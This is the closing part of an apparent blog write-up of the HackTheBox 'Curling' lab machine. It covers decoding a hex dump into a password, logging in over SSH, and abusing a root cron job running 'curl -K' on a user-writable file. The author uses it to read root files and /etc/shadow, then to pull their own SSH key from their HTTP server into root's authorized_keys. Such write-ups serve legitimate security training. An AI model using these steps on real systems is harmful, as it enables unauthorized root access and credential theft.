+</span></span><span style="display:flex;"><span>00000080: f53e <span style="color:#a5d6ff">0809</span> f073 <span style="color:#a5d6ff">5654</span> c27a <span style="color:#a5d6ff">4886</span> dfa2 e931 .&gt;...sVT.zH....1
+</span></span><span style="display:flex;"><span>00000090: c856 921b <span style="color:#a5d6ff">1221</span> <span style="color:#a5d6ff">3385</span> <span style="color:#a5d6ff">6046</span> a2dd c173 0d22 .V...!3.<span style="color:#a5d6ff">`</span>F...s.<span style="color:#a5d6ff">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290 ..n....7j:X.d.R.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503 .k./... ....)p..
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843 7..;.....9...P.C
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c .Y.P...HB....*..
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090 .G.. .U@r..rE8P.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">000000f0: 819b bb48
+</span></span></span></code></pre></div><p>I took this file to my machine and started decoding it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/curling$ xxd -r florispass.hex &gt; florispass.plain
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/curling$ file florispass.plain
+</span></span><span style="display:flex;"><span>florispass.plain: bzip2 compressed data, block <span style="color:#79c0ff">size</span> <span style="color:#ff7b72;font-weight:bold">=</span> 900k
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/curling$ bzip2 -d florispass.plain
+</span></span><span style="display:flex;"><span>bzip2: Can<span style="color:#a5d6ff">&#39;t guess original name for florispass.plain -- using florispass.plain.out
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">matt@kali:~/htb/curling$ ls
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">curlhome curlsecret edittemplate.png florisdir florispass.hex florispass.plain.out gobusterhome joomlaadminpanel.png nmap php-reverse-shell.php secretplain site1.png testingnotes usershell
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">matt@kali:~/htb/curling$ file florispass.plain.out
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">florispass.plain.out: gzip compressed data, was &#34;password&#34;, last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">matt@kali:~/htb/curling$ mv florispass.plain.out florispass.gz
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">matt@kali:~/htb/curling$ gunzip florispass.gz
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">matt@kali:~/htb/curling$ ls
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">curlhome curlsecret edittemplate.png florisdir florispass florispass.hex gobusterhome joomlaadminpanel.png nmap php-reverse-shell.php secretplain site1.png testingnotes usershell
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">matt@kali:~/htb/curling$ cat florispass
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">BZh91AY&amp;SY6Ǎ@@Pt t&#34;dhhOPIS@68ET&gt;P@#I bՃ|3x(*N&amp;Hk1x&#34;{]B@6matt@kali:~/htb/curling$ file florispass
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">florispass: bzip2 compressed data, block size = 900k
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">matt@kali:~/htb/curling$ bzip2 -d florispass
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">bzip2: Can&#39;</span>t guess original name <span style="color:#ff7b72">for</span> florispass -- using florispass.out
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/curling$ cat florispass.out
+</span></span><span style="display:flex;"><span>password.txt0000644000000000000000000000002313301066143012147 0ustar rootroot5d&lt;wdCbdZu<span style="color:#ff7b72;font-weight:bold">)</span>|hChXll
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/curling$ file florispass.out
+</span></span><span style="display:flex;"><span>florispass.out: POSIX tar archive <span style="color:#ff7b72;font-weight:bold">(</span>GNU<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/curling$ tar xvf florispass.out
+</span></span><span style="display:flex;"><span>password.txt
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/curling$ cat password.txt
+</span></span><span style="display:flex;"><span>5d&lt;wdCbdZu<span style="color:#ff7b72;font-weight:bold">)</span>|hChXll
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/curling$ file password.txt
+</span></span><span style="display:flex;"><span>password.txt: ASCII text
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/curling$ ssh floris@10.10.10.150
+</span></span><span style="display:flex;"><span>floris@10.10.10.150<span style="color:#f85149">&#39;</span>s password:
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04 LTS <span style="color:#ff7b72;font-weight:bold">(</span>GNU/Linux 4.15.0-22-generic x86_64<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>    * Documentation: https://help.ubuntu.com
+</span></span><span style="display:flex;"><span>    * Management: https://landscape.canonical.com
+</span></span><span style="display:flex;"><span>    * Support: https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>    System information as of Sun Apr <span style="color:#a5d6ff">19</span> 04:12:32 UTC <span style="color:#a5d6ff">2020</span>
+</span></span><span style="display:flex;"><span>    System load: 0.08 Processes: <span style="color:#a5d6ff">169</span>
+</span></span><span style="display:flex;"><span>    Usage of /: 47.2% of 9.78GB Users logged in: <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span>    Memory usage: 28% IP address <span style="color:#ff7b72">for</span> ens33: 10.10.10.150
+</span></span><span style="display:flex;"><span>    Swap usage: 0%
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">0</span> packages can be updated.
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">0</span> updates are security updates.
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span>Last login: Sun Apr <span style="color:#a5d6ff">19</span> 04:11:51 <span style="color:#a5d6ff">2020</span> from 10.10.14.105
+</span></span><span style="display:flex;"><span>floris@curling:~$
+</span></span></code></pre></div><p>As Floris, I had much more freedom to work and poke around. Within /home/floris/admin-area, there were two files, one called &lsquo;input&rsquo; and the other &lsquo;report&rsquo;. Input was owned by Floris, but report was owned by root. Furthermore, the files were being updated every minute. Hypothesizing that I could manipulate &lsquo;input&rsquo; to execute arbitrary code, I set the content of &lsquo;input&rsquo; as <code>url = &quot;http://10.10.14.30:9999&quot;</code> and waited with my netcat listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/curling$ sudo nc -nvlp <span style="color:#a5d6ff">9999</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> matt:
+</span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">9999</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.105<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.10.10.150<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">50886</span>
+</span></span><span style="display:flex;"><span>GET / HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 10.10.14.105:9999
+</span></span><span style="display:flex;"><span>User-Agent: curl/7.58.0
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span></code></pre></div><p>After that, I decided to use &lsquo;file://&rsquo; in order to get the root flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>floris@curling:~/admin-area$ cat input
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">url</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;file:///root/root.txt&#34;</span>
+</span></span><span style="display:flex;"><span>floris@curling:~/admin-area$ cat report
+</span></span><span style="display:flex;"><span>82c...
+</span></span></code></pre></div><p>Of course, the point of HackTheBox, at least in my mind, is to get a root shell, not just the root flag. I grabbed /etc/shadow to see if I could crack root&rsquo;s hash, but it was a salted SHA-512 hash. I decided not to go down that road. The next file I got was root&rsquo;s cronjob file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>floris@curling:~/admin-area$ cat input
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">url</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;file:///var/spool/cron/crontabs/root&#34;</span>
+</span></span><span style="display:flex;"><span>floris@curling:~/admin-area$ cat report
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># (/tmp/crontab.1F3WTb/crontab installed on Tue May 22 19:02:51 2018)</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Edit this file to introduce tasks to be run by cron.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#        </span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Each task to run has to be defined through a single line</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># indicating with different fields when the task will be run</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># and what command to run for the task</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#        </span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># To define the time you can provide concrete values for</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># minute (m), hour (h), day of month (dom), month (mon),</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).#        </span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Notice that tasks will be started based on the cron&#39;s system</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># daemon&#39;s notion of time and timezones.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#        </span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Output of the crontab jobs (including errors) is sent through</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># email to the user the crontab file belongs to (unless redirected).</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#        </span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># For example, you can run a backup of all your user accounts</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># at 5 a.m every week with:</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#        </span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># For more information see the manual pages of crontab(5) and cron(8)</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#        </span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># m h dom mon dow command</span>
+</span></span><span style="display:flex;"><span>* * * * * curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+</span></span><span style="display:flex;"><span>* * * * * sleep 1; cat /root/default.txt &gt; /home/floris/admin-area/input
+</span></span></code></pre></div><p>After seeing that root was running &lsquo;curl -K&rsquo;, I researched the &lsquo;-K&rsquo; flag and learned that you could specify more than just the url. Notably, you can specify an output location. Armed with this information, my goal was to overwrite the /root/.ssh/authorized_keys file with my own SSH public key. If successful, I could simply run <code>ssh root@10.10.10.150</code> and get a password-free root shell. Ordinarily, you should definitely NOT use a passwordless SSH key. I only use this Kali instance for CTFs, so there&rsquo;s not really any risk associated with this decision.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>floris@curling:~/admin-area$ cat input
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">url</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;http://10.10.14.30/id_rsa.pub&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">output</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/root/.ssh/authorized_keys&#34;</span>
+</span></span><span style="display:flex;"><span>user-agent <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;hello&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/.ssh$ sudo python3 -m http.server <span style="color:#a5d6ff">80</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#a5d6ff">80</span> <span style="color:#ff7b72;font-weight:bold">(</span>http://0.0.0.0:80/<span style="color:#ff7b72;font-weight:bold">)</span> ...
+</span></span><span style="display:flex;"><span>10.10.10.150 - - <span style="color:#ff7b72;font-weight:bold">[</span>27/Apr/2020 18:19:19<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#34;GET /id_rsa.pub HTTP/1.1&#34;</span> <span style="color:#a5d6ff">200</span> -
+</span></span><span style="display:flex;"><span>matt@kali:~$ ssh root@10.10.10.150
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04 LTS <span style="color:#ff7b72;font-weight:bold">(</span>GNU/Linux 4.15.0-22-generic x86_64<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>    * Documentation: https://help.ubuntu.com
+</span></span><span style="display:flex;"><span>    * Management: https://landscape.canonical.com
+</span></span><span style="display:flex;"><span>    * Support: https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>    System information as of Mon Apr <span style="color:#a5d6ff">27</span> 23:24:34 UTC <span style="color:#a5d6ff">2020</span>
+</span></span><span style="display:flex;"><span>    System load: 0.0 Processes: <span style="color:#a5d6ff">167</span>
+</span></span><span style="display:flex;"><span>    Usage of /: 46.2% of 9.78GB Users logged in: <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span>    Memory usage: 20% IP address <span style="color:#ff7b72">for</span> ens33: 10.10.10.150
+</span></span><span style="display:flex;"><span>    Swap usage: 0%
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">0</span> packages can be updated.
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">0</span> updates are security updates.
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span>Last login: Tue Sep <span style="color:#a5d6ff">25</span> 21:56:22 <span style="color:#a5d6ff">2018</span>
+</span></span><span style="display:flex;"><span>root@curling:~# id
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span></code></pre></div><p>As a final note, there are certainly other ways to get a root shell. You could overwrite the sudoers file, for example. Besides that, there&rsquo;s not much more to it. Hopefully I explained it well.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2020 -
+    
+    2025
+     matt johnson 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
